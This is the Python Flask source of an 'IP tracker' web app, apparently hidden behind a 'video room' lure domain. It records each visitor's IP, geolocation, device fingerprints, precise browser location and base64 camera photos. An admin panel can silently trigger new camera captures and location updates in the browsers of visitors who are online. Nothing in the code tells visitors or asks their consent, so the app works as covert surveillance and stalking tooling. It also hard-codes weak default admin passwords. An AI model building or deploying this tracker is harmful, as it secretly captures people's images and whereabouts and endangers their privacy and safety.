import os
import json
import requests
from datetime import datetime, timezone, timedelta
from functools import wraps
from dotenv import load_dotenv
from flask import Flask, render_template, request, jsonify, redirect, url_for, session, Response
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import check_password_hash
from flask_migrate import Migrate
from flask_socketio import SocketIO, emit, join_room, leave_room
import pytz

# Load environment variables
load_dotenv()

app = Flask(__name__)

# Production configuration for Render/Railway
if os.getenv('RENDER') or os.getenv('RAILWAY_ENVIRONMENT'):
    # Use environment variable for database URL
    database_url = os.getenv('DATABASE_URL')
    # Fix postgres:// to postgresql:// for SQLAlchemy
    if database_url and database_url.startswith('postgres://'):
        database_url = database_url.replace('postgres://', 'postgresql://', 1)
    app.config['SQLALCHEMY_DATABASE_URI'] = database_url
    app.secret_key = os.getenv('SECRET_KEY', 'production-secret-key-change-this')
else:
    # Local development configuration
    app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql://postgres:admin@localhost:5432/ip_tracker'
    app.secret_key = "ABC@123"

app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Configure admin credentials
ADMIN_USERNAME = os.getenv('ADMIN_USERNAME', 'admin')
ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD', 'admin123')

# IST Timezone
IST = pytz.timezone('Asia/Kolkata')

# Initialize database
db = SQLAlchemy(app)
migrate = Migrate(app, db)

# Initialize SocketIO for real-time communication
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Store active visitor sessions (visitor_id -> session_id)
active_visitors = {}

# Utility function to get current IST time
def get_ist_time():
    return datetime.now(IST)

# Redirect old domain to new domain
@app.before_request
def redirect_to_new_domain():
    if request.host == 'ip-tracker.onrender.com':
        new_url = request.url.replace('ip-tracker.onrender.com', 'wild-video-room.onrender.com')
        return redirect(new_url, code=301)

# Define database model
class VisitorData(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    ip_address = db.Column(db.String(45), nullable=False)
    user_agent = db.Column(db.Text, nullable=False)
    browser = db.Column(db.String(255))
    browser_version = db.Column(db.String(255))
    operating_system = db.Column(db.String(255))
    device = db.Column(db.String(255))
    screen_resolution = db.Column(db.String(255))
    language = db.Column(db.String(255))
    referrer = db.Column(db.Text)
    visit_time = db.Column(db.DateTime, default=lambda: datetime.now(IST))
    country = db.Column(db.String(255))
    city = db.Column(db.String(255))
    region = db.Column(db.String(255))
    latitude = db.Column(db.String(255))
    longitude = db.Column(db.String(255))
    location_accuracy = db.Column(db.String(255))
    location_source = db.Column(db.String(255), default='ip_geolocation')
    
    # Enhanced tracking fields
    camera_image = db.Column(db.Text)  # Base64 encoded image
    camera_timestamp = db.Column(db.DateTime)
    device_fingerprint = db.Column(db.String(255))
    timezone = db.Column(db.String(100))
    battery_level = db.Column(db.String(50))
    connection_type = db.Column(db.String(50))
    platform_details = db.Column(db.Text)
    canvas_fingerprint = db.Column(db.String(255))
    webgl_fingerprint = db.Column(db.String(255))
    fonts_available = db.Column(db.Text)
    device_memory = db.Column(db.String(50))
    hardware_concurrency = db.Column(db.String(50))
    touch_support = db.Column(db.Boolean, default=False)
    cookies_enabled = db.Column(db.Boolean, default=True)
    do_not_track = db.Column(db.String(50))

    def to_dict(self):
        # Convert times to IST for display
        visit_time_ist = self.visit_time.astimezone(IST) if self.visit_time else None
        camera_time_ist = self.camera_timestamp.astimezone(IST) if self.camera_timestamp else None
        return {
            'id': self.id,
            'ip_address': self.ip_address,
            'user_agent': self.user_agent,
            'browser': self.browser,
            'browser_version': self.browser_version,
            'operating_system': self.operating_system,
            'device': self.device,
            'screen_resolution': self.screen_resolution,
            'language': self.language,
            'referrer': self.referrer,
            'visit_time': visit_time_ist.strftime('%Y-%m-%d %I:%M:%S %p IST') if visit_time_ist else None,
            'country': self.country,
            'city': self.city,
            'region': self.region,
            'latitude': self.latitude,
            'longitude': self.longitude,
            'camera_timestamp': camera_time_ist.strftime('%Y-%m-%d %I:%M:%S %p IST') if camera_time_ist else None,
            'has_camera': bool(self.camera_image),
            'device_fingerprint': self.device_fingerprint,
            'timezone': self.timezone,
            'battery_level': self.battery_level,
            'connection_type': self.connection_type,
            'platform_details': self.platform_details,
            'device_memory': self.device_memory,
            'hardware_concurrency': self.hardware_concurrency,
            'touch_support': self.touch_support
        }


# Create database tables
with app.app_context():
    db.create_all()


# Utility functions
def get_browser_info(user_agent):
    """Extract browser information from user agent string with improved device detection"""
    import re
    
    browser = "Unknown"
    browser_version = ""
    os_platform = "Unknown"
    device = "Desktop"
    
    # Convert to lowercase for easier matching
    ua_lower = user_agent.lower()
    
    # Improved device detection (check this first)
    if "ipad" in ua_lower:
        device = "Tablet"
        os_platform = "iOS"
    elif "tablet" in ua_lower or "kindle" in ua_lower:
        device = "Tablet"
    elif "mobile" in ua_lower or "android" in ua_lower:
        # Check if it's actually a tablet
        if "tablet" not in ua_lower and "ipad" not in ua_lower:
            device = "Mobile"
    elif "iphone" in ua_lower or "ipod" in ua_lower:
        device = "Mobile"
        os_platform = "iOS"
    # Additional mobile indicators
    elif any(x in ua_lower for x in ['webos', 'blackberry', 'iemobile', 'opera mini', 'opera mobi']):
        device = "Mobile"
    # Check for Windows Phone
    elif "windows phone" in ua_lower:
        device = "Mobile"
        os_platform = "Windows Phone"
    
    # Detect operating system (if not already set)
    if os_platform == "Unknown":
        if "windows nt" in ua_lower or "win64" in ua_lower or "win32" in ua_lower:
            os_platform = "Windows"
            if "windows nt 10" in ua_lower:
                os_platform = "Windows 10/11"
            elif "windows nt 6.3" in ua_lower:
                os_platform = "Windows 8.1"
            elif "windows nt 6.2" in ua_lower:
                os_platform = "Windows 8"
            elif "windows nt 6.1" in ua_lower:
                os_platform = "Windows 7"
        elif "macintosh" in ua_lower or "mac os x" in ua_lower:
            os_platform = "Mac OS"
            # Extract Mac OS version
            mac_match = re.search(r"mac os x (\d+[._]\d+)", ua_lower)
            if mac_match:
                os_platform = f"Mac OS {mac_match.group(1).replace('_', '.')}"
        elif "linux" in ua_lower and "android" not in ua_lower:
            os_platform = "Linux"
        elif "android" in ua_lower:
            os_platform = "Android"
            # Extract Android version
            android_match = re.search(r"android (\d+\.?\d*)", ua_lower)
            if android_match:
                os_platform = f"Android {android_match.group(1)}"
        elif "iphone" in ua_lower or "ipad" in ua_lower or "ipod" in ua_lower:
            os_platform = "iOS"
            # Extract iOS version
            ios_match = re.search(r"os (\d+[._]\d+)", ua_lower)
            if ios_match:
                os_platform = f"iOS {ios_match.group(1).replace('_', '.')}"
    
    # Detect browser (order matters - check specific browsers before generic ones)
    if "edg/" in ua_lower or "edge/" in ua_lower:
        browser = "Microsoft Edge"
        edge_match = re.search(r"(?:edg|edge)/(\d+\.\d+)", ua_lower)
        if edge_match:
            browser_version = edge_match.group(1)
    elif "opr/" in ua_lower or "opera" in ua_lower:
        browser = "Opera"
        opera_match = re.search(r"(?:opr|opera)/(\d+\.\d+)", ua_lower)
        if opera_match:
            browser_version = opera_match.group(1)
    elif "chrome/" in ua_lower and "edg" not in ua_lower:
        browser = "Google Chrome"
        chrome_match = re.search(r"chrome/(\d+\.\d+)", ua_lower)
        if chrome_match:
            browser_version = chrome_match.group(1)
    elif "firefox/" in ua_lower:
        browser = "Mozilla Firefox"
        firefox_match = re.search(r"firefox/(\d+\.\d+)", ua_lower)
        if firefox_match:
            browser_version = firefox_match.group(1)
    elif "safari/" in ua_lower and "chrome" not in ua_lower:
        browser = "Safari"
        version_match = re.search(r"version/(\d+\.\d+)", ua_lower)
        if version_match:
            browser_version = version_match.group(1)
    elif "msie" in ua_lower or "trident" in ua_lower:
        browser = "Internet Explorer"
        ie_match = re.search(r"(?:msie |rv:)(\d+\.\d+)", ua_lower)
        if ie_match:
            browser_version = ie_match.group(1)
    
    return {
        'browser': browser,
        'browser_version': browser_version,
        'os': os_platform,
        'device': device
    }


def get_geolocation(ip_address):
    """Get geolocation information from IP address"""
    # Skip geolocation lookup for localhost/private IPs
    if ip_address in ['127.0.0.1', 'localhost', '::1'] or ip_address.startswith('192.168.') or ip_address.startswith('10.'):
        return {
            'country': 'Local',
            'city': 'Local',
            'region': 'Local',
            'latitude': '0',
            'longitude': '0'
        }
    
    try:
        url = f"http://ip-api.com/json/{ip_address}"
        response = requests.get(url, timeout=5)
        
        if response.status_code == 200:
            data = response.json()
            
            if data and data.get('status') == 'success':
                return {
                    'country': data.get('country', 'Unknown'),
                    'city': data.get('city', 'Unknown'),
                    'region': data.get('regionName', 'Unknown'),
                    'latitude': str(data.get('lat', 'Unknown')),
                    'longitude': str(data.get('lon', 'Unknown'))
                }
    except Exception as e:
        print(f"Error getting geolocation: {e}")
    
    return {
        'country': 'Unknown',
        'city': 'Unknown',
        'region': 'Unknown',
        'latitude': 'Unknown',
        'longitude': 'Unknown'
    }


# Authentication decorator
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'authenticated' not in session or not session['authenticated']:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function


# Basic HTTP authentication decorator
def http_auth_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        auth = request.authorization
        if not auth or auth.username != ADMIN_USERNAME or auth.password != ADMIN_PASSWORD:
            return Response(
                'Authentication required',
                401,
                {'WWW-Authenticate': 'Basic realm="Admin Area"'}
            )
        return f(*args, **kwargs)
    return decorated_function


# Routes
@app.route('/')
def index():
    """Homepage route that collects visitor information"""
    # Get IP address
    ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    
    # Get user agent
    user_agent = request.headers.get('User-Agent', '')
    
    # Get browser information
    browser_info = get_browser_info(user_agent)
    browser = browser_info['browser']
    browser_version = browser_info['browser_version']
    operating_system = browser_info['os']
    device = browser_info['device']
    
    # Get referrer
    referrer = request.referrer or ''
    
    # Get language
    language = request.headers.get('Accept-Language', '')
    
    # Get geolocation
    geo_info = get_geolocation(ip_address)
    
    # Create new visitor record
    visitor = VisitorData(
        ip_address=ip_address,
        user_agent=user_agent,
        browser=browser,
        browser_version=browser_version,
        operating_system=operating_system,
        device=device,
        referrer=referrer,
        language=language,
        country=geo_info['country'],
        city=geo_info['city'],
        region=geo_info['region'],
        latitude=geo_info['latitude'],
        longitude=geo_info['longitude']
    )
    
    db.session.add(visitor)
    db.session.commit()
    
    return render_template('index.html', visitor_id=visitor.id)


@app.route('/check_ip', methods=['GET'])
def check_ip():
    """Check if the user is using a VPN or proxy."""
    ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    
    # For local development, simulate a non-VPN connection
    if ip_address in ['127.0.0.1', 'localhost', '::1']:
        return jsonify({'vpn': False})

    try:
        # Use a service that provides VPN/proxy detection. 
        # ip-api.com's 'proxy' field is a good option for this.
        # The 'security' field is also available on some services, which is more detailed
        response = requests.get(f'http://ip-api.com/json/{ip_address}?fields=proxy')
        response.raise_for_status()  # Raise an exception for bad status codes
        data = response.json()
        
        # Check if the 'proxy' field is true
        is_vpn = data.get('proxy', False)
        
        return jsonify({'vpn': is_vpn})

    except requests.exceptions.RequestException as e:
        print(f"Error checking IP: {e}")
        # In case of an error, assume it's not a VPN to not block legitimate users
        return jsonify({'vpn': False})


@app.route('/update_screen_resolution', methods=['POST'])
def update_screen_resolution():
    """Update screen resolution via AJAX"""
    resolution = request.form.get('resolution', '')
    visitor_id = request.form.get('visitor_id', '')
    
    if resolution and visitor_id:
        visitor = VisitorData.query.get(visitor_id)
        if visitor:
            visitor.screen_resolution = resolution
            db.session.commit()
            return jsonify({'success': True})
    
    return jsonify({'success': False})


@app.route('/login', methods=['GET', 'POST'])
def login():
    """Login page for admin access"""
    error = None
    
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['authenticated'] = True
            return redirect(url_for('admin'))
        else:
            error = 'Invalid credentials. Please try again.'
    
    return render_template('login.html', error=error)

@app.route('/update_precise_location', methods=['POST'])
def update_precise_location():
    """Update precise location coordinates via AJAX"""
    latitude = request.form.get('latitude', '')
    longitude = request.form.get('longitude', '')
    accuracy = request.form.get('accuracy', '')
    visitor_id = request.form.get('visitor_id', '')
    
    if latitude and longitude and visitor_id:
        visitor = VisitorData.query.get(visitor_id)
        if visitor:
            visitor.latitude = latitude
            visitor.longitude = longitude
            visitor.location_accuracy = accuracy
            visitor.location_source = 'browser_geolocation'
            db.session.commit()
            return jsonify({'success': True})
    
    return jsonify({'success': False})
    
@app.route('/update_location', methods=['POST'])
def update_location():
    """Update user location data via AJAX"""
    visitor_id = request.form.get('visitor_id', '')
    latitude = request.form.get('latitude', '')
    longitude = request.form.get('longitude', '')
    
    if visitor_id and latitude and longitude:
        visitor = VisitorData.query.get(visitor_id)
        if visitor:
            visitor.latitude = latitude
            visitor.longitude = longitude
            db.session.commit()
            return jsonify({'success': True})
    
    return jsonify({'success': False})

@app.route('/logout')
def logout():
    """Logout route"""
    session.pop('authenticated', None)
    return redirect(url_for('login'))


@app.route('/admin')
@login_required
def admin():
    """Admin dashboard to view visitor data"""
    return render_template('admin.html')


@app.route('/api/visitors')
@login_required
def api_visitors():
    """API endpoint to get visitor data"""
    visitors = VisitorData.query.order_by(VisitorData.visit_time.desc()).all()
    return jsonify([visitor.to_dict() for visitor in visitors])


@app.route('/list')
@http_auth_required
def list_visitors():
    """Alternative admin page using HTTP Basic Auth"""
    visitors = VisitorData.query.order_by(VisitorData.visit_time.desc()).all()
    return render_template('list.html', visitors=visitors)


@app.route('/api/upload_camera', methods=['POST'])
def upload_camera():
    """Upload camera image via AJAX"""
    try:
        data = request.get_json()
        visitor_id = data.get('visitor_id')
        camera_image = data.get('camera_image')
        
        if visitor_id and camera_image:
            visitor = VisitorData.query.get(visitor_id)
            if visitor:
                visitor.camera_image = camera_image
                visitor.camera_timestamp = get_ist_time()
                db.session.commit()
                return jsonify({'success': True, 'message': 'Camera image uploaded'})
        
        return jsonify({'success': False, 'message': 'Invalid data'})
    except Exception as e:
        print(f"Error uploading camera: {e}")
        return jsonify({'success': False, 'message': str(e)})


@app.route('/api/update_device_info', methods=['POST'])
def update_device_info():
    """Update enhanced device information via AJAX"""
    try:
        data = request.get_json()
        visitor_id = data.get('visitor_id')
        
        if visitor_id:
            visitor = VisitorData.query.get(visitor_id)
            if visitor:
                # Update all available fields
                if data.get('device_fingerprint'):
                    visitor.device_fingerprint = data.get('device_fingerprint')
                if data.get('timezone'):
                    visitor.timezone = data.get('timezone')
                if data.get('battery_level'):
                    visitor.battery_level = data.get('battery_level')
                if data.get('connection_type'):
                    visitor.connection_type = data.get('connection_type')
                if data.get('platform_details'):
                    visitor.platform_details = data.get('platform_details')
                if data.get('canvas_fingerprint'):
                    visitor.canvas_fingerprint = data.get('canvas_fingerprint')
                if data.get('webgl_fingerprint'):
                    visitor.webgl_fingerprint = data.get('webgl_fingerprint')
                if data.get('fonts_available'):
                    visitor.fonts_available = data.get('fonts_available')
                if data.get('device_memory'):
                    visitor.device_memory = data.get('device_memory')
                if data.get('hardware_concurrency'):
                    visitor.hardware_concurrency = data.get('hardware_concurrency')
                if 'touch_support' in data:
                    visitor.touch_support = data.get('touch_support')
                if 'cookies_enabled' in data:
                    visitor.cookies_enabled = data.get('cookies_enabled')
                if data.get('do_not_track'):
                    visitor.do_not_track = data.get('do_not_track')
                
                db.session.commit()
                return jsonify({'success': True, 'message': 'Device info updated'})
        
        return jsonify({'success': False, 'message': 'Invalid visitor ID'})
    except Exception as e:
        print(f"Error updating device info: {e}")
        return jsonify({'success': False, 'message': str(e)})


@app.route('/api/get_camera/<int:visitor_id>')
@login_required
def get_camera(visitor_id):
    """Get camera image for a specific visitor"""
    try:
        visitor = VisitorData.query.get(visitor_id)
        if visitor and visitor.camera_image:
            camera_time_ist = visitor.camera_timestamp.astimezone(IST) if visitor.camera_timestamp else None
            return jsonify({
                'success': True,
                'camera_image': visitor.camera_image,
                'timestamp': camera_time_ist.strftime('%Y-%m-%d %I:%M:%S %p IST') if camera_time_ist else None
            })
        return jsonify({'success': False, 'message': 'No camera image found'})
    except Exception as e:
        print(f"Error getting camera: {e}")
        return jsonify({'success': False, 'message': str(e)})


# SocketIO event handlers
@socketio.on('connect')
def handle_connect():
    print(f'Client connected: {request.sid}')

@socketio.on('disconnect')
def handle_disconnect():
    # Remove visitor from active sessions
    for visitor_id, sid in list(active_visitors.items()):
        if sid == request.sid:
            del active_visitors[visitor_id]
            print(f'Visitor {visitor_id} disconnected')
    print(f'Client disconnected: {request.sid}')

@socketio.on('register_visitor')
def handle_register_visitor(data):
    visitor_id = data.get('visitor_id')
    if visitor_id:
        active_visitors[visitor_id] = request.sid
        join_room(f'visitor_{visitor_id}')
        print(f'Visitor {visitor_id} registered with session {request.sid}')
        emit('registered', {'status': 'success'})

# Admin trigger endpoints
@app.route('/api/trigger_recapture_camera/<int:visitor_id>', methods=['POST'])
@login_required
def trigger_recapture_camera(visitor_id):
    """Admin endpoint to trigger silent camera recapture"""
    try:
        if visitor_id in active_visitors:
            # Send command to visitor's browser
            socketio.emit('recapture_camera', 
                         {'visitor_id': visitor_id}, 
                         room=f'visitor_{visitor_id}')
            return jsonify({
                'success': True, 
                'message': 'Camera recapture command sent',
                'status': 'online'
            })
        else:
            return jsonify({
                'success': False, 
                'message': 'Visitor is not currently online',
                'status': 'offline'
            })
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/trigger_recapture_location/<int:visitor_id>', methods=['POST'])
@login_required
def trigger_recapture_location(visitor_id):
    """Admin endpoint to trigger silent location update"""
    try:
        if visitor_id in active_visitors:
            # Send command to visitor's browser
            socketio.emit('recapture_location', 
                         {'visitor_id': visitor_id}, 
                         room=f'visitor_{visitor_id}')
            return jsonify({
                'success': True, 
                'message': 'Location update command sent',
                'status': 'online'
            })
        else:
            return jsonify({
                'success': False, 
                'message': 'Visitor is not currently online',
                'status': 'offline'
            })
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/check_visitor_online/<int:visitor_id>', methods=['GET'])
@login_required
def check_visitor_online(visitor_id):
    """Check if visitor is currently online"""
    is_online = visitor_id in active_visitors
    return jsonify({
        'online': is_online,
        'visitor_id': visitor_id
    })

if __name__ == '__main__':
    app.run(debug=True,host='0.0.0.0')